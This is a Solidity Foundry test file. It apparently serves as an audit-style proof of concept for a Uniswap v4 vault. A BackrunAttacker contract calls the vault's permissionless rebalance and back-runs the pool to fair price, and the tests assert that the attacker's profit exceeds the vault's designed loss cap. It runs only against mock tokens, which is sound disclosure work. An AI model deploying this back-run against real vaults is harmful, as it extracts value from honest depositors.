// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVault as IWings} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultInventory as Inventory} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultInventory.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultTypes as Types} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultTypes.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor as Actor} from
    "test/foundry/spec/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/reference/UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor.sol";

/// @notice Unprivileged back-runner: calls the PERMISSIONLESS rebalance at the clean fair price, then swaps the
///         pool back to p0 with its own capital (all in one tx). Holds no vault shares, never manipulates first.
contract BackrunAttacker {
    IPoolManager immutable pm;
    PoolKey key;
    Actor public actor;
    uint160 constant P0 = uint160(1) << 96;
    constructor(IPoolManager pm_, PoolKey memory key_) { pm = pm_; key = key_; actor = new Actor(pm_, address(this)); }
    function attack(address vault_) external {
        Rebalance(vault_).rebalance(0, block.timestamp);
        (uint160 p,,,) = StateLibrary.getSlot0(pm, key.toId());
        if (p != P0) actor.swapTo(key, p > P0, 1e24, P0);
    }
}

contract FzWingsBackrunCapTestProd0 is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;

    uint160 constant P0 = uint160(1) << 96;
    Actor internal arb;
    Actor internal extLp;
    address internal anchor = makeAddr("anchor");
    address internal alice = makeAddr("alice");

    function setUp() public virtual override {
        super.setUp();
        vm.prank(owner); indexedexManager.setDefaultLiquidReservePercentage(0);
        extLp = new Actor(pool, address(this));
        arb = new Actor(pool, address(this));
        token0.mint(address(extLp), 1e25); token1.mint(address(extLp), 1e25);
        token0.mint(address(arb), 1e27); token1.mint(address(arb), 1e27);
        extLp.modify(key, -887220, 887220, int256(uint256(1e18)), bytes32(0)); // external full-range depth
        // honest anchor holders in both vaults, settled by honest keeper rebalances + independent arb to p0
        for (uint8 vi; vi < 2; ++vi) {
            IERC20 t = vi == 0 ? IERC20(address(token0)) : IERC20(address(token1));
            ERC20PermitMintableStub(address(t)).mint(anchor, 1e17);
            vm.startPrank(anchor);
            t.approve(address(_v(vi)), type(uint256).max);IStandardExchangeIn(address(_v(vi))).exchangeIn(t, 1e17, IERC20(address(_v(vi))), 0, anchor, false, block.timestamp);
            vm.stopPrank();
        }
        for (uint256 r; r < 4; ++r) {
            for (uint8 vi; vi < 2; ++vi) { try Rebalance(address(_v(vi))).rebalance(0, block.timestamp) returns (uint256) {} catch {} }
            _arbToFair();
        }
        _arbToFair();
    }

    // ------------------------------------------------------------------ helpers
    function _v(uint8 vi) internal view returns (IWings) { return vi == 0 ? wings0 : wings1; }
    function _arbToFair() internal {
        (uint160 p,,,) = pool.getSlot0(key.toId());
        if (p != P0) arb.swapTo(key, p > P0, 1e26, P0);
    }
    /// independent fair mark at the CURRENT spot (used only at p0, where raw token0 == raw token1):
    /// booked locals + manager position principal + uncollected fees.
    function _mark(uint8 vi) internal view returns (uint256 m) {
        IWings v = _v(vi);
        (uint256 a0, uint256 a1) = v.localReserves();
        (uint160 sp,,,) = pool.getSlot0(key.toId());
        for (uint8 i; i < 3; ++i) {
            (int24 lo, int24 up, uint128 liq, bytes32 salt) = v.position(i);
            if (liq == 0) continue;
            (uint128 actual, uint256 l0, uint256 l1) = pool.getPositionInfo(key.toId(), address(v), lo, up, salt);
            Types.Principal memory p = Inventory.principal(sp, lo, up, actual, false);
            (uint256 g0, uint256 g1) = pool.getFeeGrowthInside(key.toId(), lo, up);
            a0 += p.amount0 + Inventory.earnedFee(actual, g0, l0);
            a1 += p.amount1 + Inventory.earnedFee(actual, g1, l1);
        }
        m = a0 + a1;
    }
    function _liq(uint8 vi) internal view returns (uint256) { return _v(vi).liquidationValue().value; }
    /// replica of RebalanceTarget._sleeveDeficit (liquidFloor - local target) for the designed-cap computation
    function _deficit(uint8 vi) internal view returns (uint256) {
        IWings v = _v(vi);
        (uint256 l0, uint256 l1) = v.localReserves();
        uint256 local = vi == 0 ? l0 : l1;
        uint256 tgt = local;
        (uint160 sp,,,) = pool.getSlot0(key.toId());
        for (uint8 i; i < 3; ++i) {
            (int24 lo, int24 up, uint128 liq,) = v.position(i);
            if (liq == 0) continue;
            Types.Principal memory p = Inventory.principal(sp, lo, up, liq, false);
            tgt += vi == 0 ? p.amount0 : p.amount1;
        }
        uint256 floor_ = FullMath.mulDiv(tgt, 0, 1e18);
        if (floor_ == 0) floor_ = 1;
        return floor_ > local ? floor_ - local : 0;
    }
    function _bal(address a) internal view returns (uint256) { return token0.balanceOf(a) + token1.balanceOf(a); }

    struct R {
        uint256 dep; int256 atkProfit; uint256 holderFairLoss; uint256 cap; uint256 vaultMeasuredLoss;
        uint256 liqLossAtP0; uint256 markBefore; uint256 aliceFairBefore; uint256 aliceFairAfter;
    }

    function _honestDeposit(uint256 dep, bool pushed) internal {
        token0.mint(alice, dep);
        vm.startPrank(alice);
        if (pushed) {
            token0.transfer(address(wings0), dep);IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(token0)), dep, IERC20(address(wings0)), 0, alice, true, block.timestamp);
        } else {
            token0.approve(address(wings0), type(uint256).max);IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(token0)), dep, IERC20(address(wings0)), 0, alice, false, block.timestamp);
        }
        vm.stopPrank();
    }

    struct Pre { uint256 atkV0; uint256 m0; uint256 m1; uint256 S; uint256 aliceSh; uint256 liq0; uint256 defB; uint128 coreB; }

    function _pre(BackrunAttacker atk) internal view returns (Pre memory p) {
        p.atkV0 = _bal(address(atk)) + _bal(address(atk.actor()));
        p.m0 = _mark(0); p.m1 = _mark(1);
        p.S = IERC20(address(wings0)).totalSupply();
        p.aliceSh = IERC20(address(wings0)).balanceOf(alice);
        p.liq0 = _liq(0);
        p.defB = _deficit(0);
        (,, p.coreB,) = wings0.position(0);
    }

    function _event() internal returns (uint256 vb, uint256 va, uint128 coreA) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(wings0) && logs[i].topics[0] == Rebalance.Rebalanced.selector) {
                (vb, va,, coreA) = abi.decode(logs[i].data, (uint256, uint256, uint128, uint128));
            }
        }
    }

    function _scenario(uint256 dep, bool pushed) internal returns (R memory r) {
        r.dep = dep;
        _honestDeposit(dep, pushed);
        { (uint160 p,,,) = pool.getSlot0(key.toId()); require(p == P0, "deposit moved price"); }

        BackrunAttacker atk = new BackrunAttacker(pool, key);
        token0.mint(address(atk.actor()), 1e24); token1.mint(address(atk.actor()), 1e24); // own capital, fully counted
        Pre memory b = _pre(atk);
        r.markBefore = b.m0;
        r.aliceFairBefore = b.m0 * b.aliceSh / b.S;

        vm.recordLogs();
        atk.attack(address(wings0)); // unprivileged, single tx
        (uint256 vb, uint256 va, uint128 coreA) = _event();
        { (uint160 p,,,) = pool.getSlot0(key.toId()); require(p == P0, "not restored to p0"); }

        // designed cap as RebalanceTarget._validate: 1% of progress (deficit reduction + core growth share).
        uint256 defA = _deficit(0);
        uint256 progress = b.defB > defA ? b.defB - defA : 0;
        if (coreA > b.coreB) progress += FullMath.mulDiv(vb, coreA - b.coreB, coreA);
        if (progress > vb) progress = vb;
        r.cap = progress / 100;
        r.vaultMeasuredLoss = vb > va ? vb - va : 0;
        r.atkProfit = int256(_bal(address(atk)) + _bal(address(atk.actor()))) - int256(b.atkV0);
        uint256 ma = _mark(0) + _mark(1);
        r.holderFairLoss = (b.m0 + b.m1) > ma ? (b.m0 + b.m1) - ma : 0;
        r.aliceFairAfter = _mark(0) * b.aliceSh / b.S; // supply unchanged by rebalance
        uint256 liq0a = _liq(0);
        r.liqLossAtP0 = b.liq0 > liq0a ? b.liq0 - liq0a : 0;
        _log(r, pushed);
    }

    function _log(R memory r, bool pushed) internal pure {
        console2.log("deposit", r.dep, pushed ? "(pushed)" : "(approve)");
        console2.log("  vault-measured loss (at self-moved price) / designed cap 1% of progress", r.vaultMeasuredLoss, r.cap);
        console2.log("  holders fair-mark loss @p0 (both vaults)", r.holderFairLoss);
        console2.log("  wings0 liquidationValue loss re-quoted @p0", r.liqLossAtP0);
        console2.log("  wings0 fair mark before", r.markBefore);
        console2.log("  alice fair before/after", r.aliceFairBefore, r.aliceFairAfter);
        console2.log("  ATTACKER net profit @p0 (capital counted)"); console2.logInt(r.atkProfit);
        console2.log("  fair loss / cap x100", r.cap == 0 ? 0 : r.holderFairLoss * 100 / r.cap);
    }

    /// Main PoC: honest deposit leaves cash pending; anyone rebalances at fair price and back-runs.
    function test_PoC_backrunExceedsDesignedCap() public {
        R memory r = _scenario(1e17, false);
        assertGt(r.atkProfit, 0, "attacker not profitable");
        assertLe(r.vaultMeasuredLoss, r.cap, "contract check should have passed (it did: rebalance succeeded)");
        assertGt(r.holderFairLoss, r.cap, "holders' fair loss not beyond designed cap");
        assertGt(uint256(r.atkProfit), r.cap, "back-runner extracts more than the whole designed cap");
    }

    function test_sweep() public {
        uint256[6] memory deps = [uint256(2e16), 5e16, 1e17, 2e17, 4e17, 8e17];
        for (uint256 k; k < deps.length; ++k) {
            uint256 snap = vm.snapshotState();
            try this.ext_scenario(deps[k], false) {} catch (bytes memory e) { console2.log("deposit", deps[k], "reverted"); console2.logBytes(e); }
            vm.revertToState(snap);
            snap = vm.snapshotState();
            try this.ext_scenario(deps[k], true) {} catch (bytes memory e) { console2.log("pushed deposit", deps[k], "reverted"); console2.logBytes(e); }
            vm.revertToState(snap);
        }
    }
    function ext_scenario(uint256 dep, bool pushed) external { _scenario(dep, pushed); }

    /// Control: the same honest deposit settled by an honest keeper with NO back-run; an independent arb
    /// (not the keeper) restores p0 later. Holders lose the same fair value -> the leak is the rebalance swap's
    /// unmetered price impact, captured by whoever restores the price.
    function test_control_keeperThenArb() public {
        _honestDeposit(1e17, false);
        uint256 m = _mark(0) + _mark(1);
        uint256 arbV0 = _bal(address(arb));
        Rebalance(address(wings0)).rebalance(0, block.timestamp);
        _arbToFair();
        uint256 ma = _mark(0) + _mark(1);
        console2.log("control holders fair loss", m > ma ? m - ma : 0);
        console2.log("control arb profit"); console2.logInt(int256(_bal(address(arb))) - int256(arbV0));
    }
}
